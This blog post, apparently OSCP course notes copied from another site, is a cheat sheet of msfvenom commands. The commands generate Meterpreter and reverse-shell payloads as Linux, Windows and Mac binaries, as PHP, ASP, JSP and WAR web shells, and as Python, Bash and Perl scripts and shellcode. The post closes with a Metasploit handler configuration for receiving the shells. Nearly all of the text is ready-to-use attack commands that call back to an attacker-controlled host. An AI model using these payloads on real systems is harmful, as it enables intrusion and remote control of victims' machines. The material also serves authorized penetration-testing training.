---
layout: post
title:  "Creating Metasploit Payloads"
date:   2018-11-09 10:00:00 +1100
categories: [security,oscp]
permalink: /:title:output_ext
comments: true
---
<br>
{% assign colr = "#009900" %}
\-- **Copied from** https://netsec.ws/?p=331<br>
\-- The following commands work on the KaliVM provided by OffSec for the OSCP course. I never updated it and use the latest version for CTF and other research.

<br>**List payloads**

```python
msfvenom -l
```

-----
#### <span style="color:{{ colr }}">Binaries:</span>

**Linux**

```python
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

**Windows**

```python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

**Mac**

```python
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

-----
#### <span style="color:{{ colr }}">Web Payloads:</span>

**PHP**

```python
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

**ASP**

```asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

**JSP**

```python
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

**WAR**

```python
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

-----
#### <span style="color:{{ colr }}">Scripting Payloads:</span>

**Python**

```python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

**Bash**

```python
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

**Perl**

```python
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

**Shellcode**
<br>
\-- For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

-----
**Linux Based Shellcode**

```python
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

**Windows Based Shellcode**

```python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

**Mac Based Shellcode**

```python
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

-----
#### <span style="color:{{ colr }}">Handlers:</span>
<br>
\-- Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

```python
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```

\-- Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
